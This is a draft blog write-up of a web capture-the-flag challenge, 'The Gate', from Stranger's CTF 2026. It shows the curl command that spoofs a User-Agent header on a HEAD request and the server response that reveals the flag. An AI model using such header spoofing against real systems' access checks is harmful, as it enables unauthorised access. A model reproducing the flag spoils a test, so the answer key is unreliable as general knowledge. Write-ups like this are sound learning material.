---
title: "Stranger's CTF 2026 - The Gate  "
date: 2026-03-27
draft: true
categories: ["CTF"]
tags: ["ctf", "web"]
description: "Writeup for The Gate from Stranger's CTF Techtrix '26."
---

**Challenge Name:** The Gate  
**Category:** Web  
**Target:** `http://140.245.25.63:8004/`

---

### 1. Description
The challenge presents a page with two options: "CHOOSE EARTH" and "CHOOSE UPSIDE". The hint emphasizes: *"It’s not about what you’re asking for, but who is asking and how you're asking it. Legend says only a 'Wizard' knows the true way through."*

### 2. Analysis

#### Identification
1.  **Who is asking:** Initial probes with various methods revealed a hidden header when using the `HEAD` method.
2.  **How you're asking it:** Using `curl -I` (which sends a `HEAD` request) to the root or `index.php` resulted in an interesting response header: `Error: Access Denied. You are not WizardWill.`

This revealed both the required identity (`WizardWill`) and the fact that the server responds differently to the `HEAD` method.

---

### 3. Solution

The solution is sending an HTTP `HEAD` request with the `User-Agent` set to `WizardWill`.

#### Exploitation Command
```bash
curl -I -H "User-Agent: WizardWill" http://140.245.25.63:8004/
```

#### Response
```text
HTTP/1.1 200 OK
Date: Thu, 26 Mar 2026 03:03:45 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Flag: CTF{should_i_stay_or_should_i_head}
Content-Type: text/html; charset=UTF-8
```
---

### 4. Flag
`CTF{should_i_stay_or_should_i_head}`
